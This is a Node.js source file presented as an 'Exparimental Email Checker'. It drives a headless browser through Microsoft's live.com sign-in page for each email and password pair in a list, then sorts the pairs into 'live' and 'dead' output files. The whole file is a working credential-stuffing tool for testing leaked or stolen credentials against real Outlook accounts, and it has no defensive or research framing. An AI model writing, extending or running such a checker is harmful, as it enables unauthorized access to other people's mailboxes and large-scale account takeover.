console.log("Exparimental Email Checker");

const puppeteer = require("puppeteer");
const fs = require("fs").promises;
const path = require("path");
const chalk = require("chalk");

const LOGIN_URL = "https://login.live.com/login.srf";
const MAILBOX_URL = "https://outlook.live.com/owa";

const log = (message, color = "blue") => {
  const timestamp = new Date().toLocaleString();
  console.log(chalk[color](`[${timestamp}] ${message}`));
};

async function ensureFolderExists(folderPath) {
  try {
    await fs.access(folderPath);
  } catch {
    await fs.mkdir(folderPath, { recursive: true });
  }
}

async function checkEmailWithPuppeteer(
  email,
  password,
  liveWriter,
  deadWriter
) {
  let browser;
  try {
    browser = await puppeteer.launch({ headless: true });
    const page = await browser.newPage();
    await page.setDefaultNavigationTimeout(60000);

    log(`Attempting login for: ${email}`, "blue");

    await page.goto(LOGIN_URL, { waitUntil: "networkidle0" });
    await page.type("#i0116", email);
    await page.click("#idSIButton9");

    try {
      await page.waitForSelector("#i0116Error", { timeout: 2000 });
      log(`❌ Invalid email: ${email}`, "red");
      await deadWriter.write(`${email}:${password} | Invalid Email\n`);
      return { email, status: "dead", reason: "Invalid Email" };
    } catch {}

    await page.waitForSelector("#i0118", { timeout: 5000 });
    await page.type("#i0118", password);
    await page.click("#idSIButton9");

    await page
      .waitForNavigation({ waitUntil: "networkidle0", timeout: 10000 })
      .catch(() => {});

    const currentUrl = page.url();
    if (currentUrl.includes("recover") || currentUrl.includes("signin")) {
      log(`❌ Login failed for ${email}`, "red");
      await deadWriter.write(`${email}:${password} | Login Failed\n`);
      return { email, status: "dead", reason: "Login Failed" };
    }

    log(`✅ Login successful for ${email}`, "green");
    await page.goto(MAILBOX_URL, { waitUntil: "networkidle0" });

    await liveWriter.write(`${email}:${password}\n`);
    return { email, status: "live" };
  } catch (error) {
    log(`❌ Error for ${email}: ${error.message}`, "red");
    await deadWriter.write(`${email}:${password} | Error: ${error.message}\n`);
    return { email, status: "dead", reason: error.message };
  } finally {
    if (browser) await browser.close();
  }
}

async function processEmails(emailList) {
  const outputFolder = path.join(process.cwd(), "output");
  await ensureFolderExists(outputFolder);

  const liveFile = path.join(outputFolder, "live_emails.txt");
  const deadFile = path.join(outputFolder, "dead_emails.txt");

  const liveWriter = await fs.open(liveFile, "a");
  const deadWriter = await fs.open(deadFile, "a");

  let results = [];
  for (let { email, password } of emailList) {
    const result = await checkEmailWithPuppeteer(
      email,
      password,
      liveWriter,
      deadWriter
    );
    results.push(result);
  }

  await liveWriter.close();
  await deadWriter.close();

  return results;
}

module.exports = { processEmails };
